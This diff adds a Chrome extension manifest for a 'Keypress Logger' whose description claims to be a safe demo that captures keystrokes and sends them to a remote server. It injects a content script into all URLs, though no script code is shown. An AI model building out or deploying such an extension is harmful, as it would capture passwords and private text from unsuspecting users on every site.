@@ -1,0 +1,17 @@
+{
+  "name": "Keypress Logger",
+  "description": "Safe demo: captures keystrokes and sends to remote server",
+  "version": "1.0",
+  "manifest_version": 3,
+  "permissions": ["scripting"],
+  "host_permissions": ["<all_urls>"],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"]
+    }
+  ]
+}
